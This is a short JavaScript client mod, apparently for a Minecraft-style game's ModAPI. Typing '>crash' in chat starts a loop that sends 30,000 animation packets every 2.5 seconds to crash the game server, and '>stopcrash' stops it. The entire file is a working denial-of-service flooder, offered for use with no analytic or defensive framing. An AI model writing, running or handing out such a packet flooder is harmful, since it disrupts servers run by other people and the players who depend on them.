ModAPI.require("network");

function chatHandler(ev){
    console.log(ev)
    if(ev.message.startsWith(">")){
        ev.preventDefault = true;
        if(ev.message.startsWith(">crash")){
            startCrash()
        }

        else if(ev.message.startsWith(">stopcrash")){
            stopCrash()
        }
    }
}

var inter = null;

function startCrash() {
    
    if(inter == null){
        ModAPI.displayToChat({msg:"STARTING!!!"})
        inter = setInterval(function(){
        ModAPI.displayToChat({msg:"SENDING PACKETS!!!!"});
        if(ModAPI.network == null){
            stopCrash()
        }
        for(let i = 0; i < 30000; i++){
            ModAPI.network.sendPacketAnimation();
        }},2500)
    }
}

function stopCrash() {
    if(inter != null){
        ModAPI.displayToChat({msg:"KILLING!!!"})
        clearInterval(inter);
        inter = null;
    }
}

ModAPI.addEventListener("sendchatmessage",chatHandler)
